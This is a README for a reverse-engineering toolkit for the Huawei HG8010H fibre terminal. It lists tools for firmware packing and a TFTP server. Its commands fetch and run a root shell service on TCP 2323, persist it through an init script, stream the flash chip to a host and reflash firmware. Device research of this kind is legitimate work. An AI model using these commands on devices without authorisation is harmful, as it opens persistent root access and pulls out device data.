# Tools

Everything needed to reproduce the work on an HG8010H. `make` rebuilds both
binaries byte-identically to the ones shipped here (needs `arm-none-eabi-gcc`).

| File | What it does |
|---|---|
| `shellsvc.c` / `shellsvc` | root shell service on TCP **2323** (pty, foreground pgrp, SIGINT reset) |
| `flashpull.c` / `flashpull` | streams `/dev/mtd0` (16 MB) to `192.168.100.10:7000` |
| `mkpack.py` | parse / rebuild Huawei `HWNP` firmware packages |
| `tftpd.py` | minimal read-only TFTP server, for `load pack by tftp` |

## Root shell

```sh
# on the device (root shell not yet available: use the CLI bypass first)
tftp -g -l /tmp/shellsvc -r shellsvc 192.168.100.10
chmod +x /tmp/shellsvc && /tmp/shellsvc &
# or persist it: install to /bin and start from /etc/rc.d/rc.start/1.sdk_init.sh

telnet <ont> 2323
```

## Pulling the flash

```sh
# host
python3 /path/to/listen.py full.bin 7000      # see ../src/listen.py
# device
tftp -g -l /tmp/flashpull -r flashpull 192.168.100.10
chmod +x /tmp/flashpull && /tmp/flashpull
```

`flashpull` has the host and port compiled in (`192.168.100.10:7000`); edit the
two constants at the top of `_start()` if yours differ.

## Packing firmware

```sh
python3 mkpack.py info hg8012h.bin                  # header + item table
python3 mkpack.py roundtrip hg8012h.bin rebuilt.bin # must be byte-identical
```

`roundtrip` is the correctness test: a correct implementation reproduces the
reference package exactly, including the `fileLength` big-endian value with its
`-0x4C` bias.

Serve it and flash:

```sh
python3 tftpd.py -d . -p 69
# on the ONT:
#   set flashlock status 0
#   load pack by tftp svrip <host> remotefile <pack>
#   display progress load
```
